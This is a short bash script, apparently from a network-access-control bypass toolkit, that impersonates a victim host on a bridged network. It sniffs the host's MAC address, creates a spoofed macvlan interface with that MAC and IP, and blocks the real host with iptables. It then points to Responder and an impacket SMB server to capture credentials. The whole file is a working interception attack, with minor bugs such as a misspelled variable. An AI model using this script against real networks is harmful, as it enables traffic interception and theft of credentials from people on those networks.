#!/bin/bash

TARGET_IP=$1
if [ "$1" = "" ]
then
  echo "Usage:"
  echo "    intercept.sh [ip]"
  echo ""
  echo "Intercepts all traffic to an IP address by creating a virtual ethernet device with [ip] and the correct MAC address on the interception bridge (br0) created by NAC_bypass.sh"
  exit
fi

echo "Listening for traffic coming from the victim to port $2.  If this hangs, you can ctrl-c and retry with another IP and/or Port without consequences."
# Listen for a bit to find the MAC address of the DC.  This is probably the MAC address of the Switch.
TARGET_MAC=`tcpdump -i enp2s0 -nne -c 1 dst $TARGET_IP | awk '{print $2","$4$10}' | cut -f 1-4 -d. | awk -F ',' '{print $2}'`

# create a new virtual ethernet device off the bridge.
ip link add link br0 name veth0 address $TARGET_MAC type macvlan mode bridge

# assign it the IP address of the device we want to impersonate on the local network
ifconfig veth0 $TARGET_IP netmask 255.255.255.0

# prevent packets from the real 192.168.2.182 from being forwarded at the same time
iptables -A INPUT -i enp1s0 -s $TARGET_IP -j DROP

# run responder
#python3 /opt/Responder/Responder.py -I veth0 -e 192.168.2.182

# responder doesn't work run something else:
#python3 /opt/impacket/examples/smbserver.py -ip $TARGET_IP -smb2support -debug Media /mnt

echo "You're ready to run some kind of collection mechanism as $TARGET_IP using veth0"
echo "I suggest /opt/impacket/examples/smbserver.py -ip $TAGET_IP -smb2support -debug [Share Name] [Folder]"
